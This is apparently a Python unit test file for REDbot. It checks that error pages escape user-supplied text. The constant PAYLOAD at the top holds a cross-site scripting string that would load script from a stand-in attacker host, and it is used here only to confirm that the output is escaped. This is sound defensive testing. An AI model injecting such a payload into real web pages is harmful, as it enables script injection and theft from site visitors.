#!/usr/bin/env python3

import unittest
from configparser import ConfigParser
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

import thor.http.error as httperr

from redbot.formatter import find_formatter
from redbot.i18n import set_locale
from redbot.resource import HttpResource
from redbot.webui import RedWebUi
from redbot.webui.handlers.run_test import _validate_req_hdrs

PAYLOAD = "<script/src=//attacker.test/x.js></script>"


def _config():
    parser = ConfigParser()
    parser.read_dict({"redbot": {}})
    return parser["redbot"]


def make_formatter(output):
    config = _config()
    resource = HttpResource(config)
    return find_formatter("html")(config, resource, output, {"nonce": "n"})


class TestErrorOutputEscaping(unittest.TestCase):
    def test_error_output_escapes_message(self):
        out = []
        with set_locale("en"):
            make_formatter(out.append).error_output(f"bad ({PAYLOAD})")
        page = "".join(out)
        self.assertNotIn("<script/src", page)
        self.assertIn("&lt;script/src=//attacker.test/x.js&gt;&lt;/script&gt;", page)

    def test_fetch_error_detail_is_escaped(self):
        out = []
        formatter = make_formatter(out.append)
        formatter.resource.fetch_error = httperr.HttpVersionError(PAYLOAD)
        with set_locale("en"):
            formatter.finish_output()
        page = "".join(out)
        self.assertIn("Unrecognised HTTP version", page)
        self.assertNotIn("<script/src", page)
        self.assertIn("&lt;script/src", page)

    def test_plain_message_unchanged(self):
        out = []
        with set_locale("en"):
            make_formatter(out.append).error_output("REDbot timeout.")
        self.assertIn("<p class='error foo'>REDbot timeout.</p>", "".join(out))


class TestErrorResponse(unittest.TestCase):
    def test_user_text_in_validation_error_is_escaped(self):
        # _validate_req_hdrs echoes the user's header text into its message
        _headers, error = _validate_req_hdrs([f"{PAYLOAD}no-colon"])
        self.assertIn("<script", error)  # the message itself is plain text
        out = []
        ui = SimpleNamespace(
            config=_config(),
            nonce="n",
            locale="en",
            timeout=None,
            response_done=False,
            response_started=False,
            exchange=MagicMock(),
            output=out.append,
            error_log=MagicMock(),
            query_string={},
        )
        with patch("redbot.webui.find_formatter") as finder:
            finder.return_value = lambda cfg, res, output, params: make_formatter(out.append)
            RedWebUi.error_response(ui, b"400", b"Bad Request", error)
        page = "".join(out)
        self.assertNotIn("<script/src", page)
        self.assertIn("&lt;script/src", page)


if __name__ == "__main__":
    unittest.main()
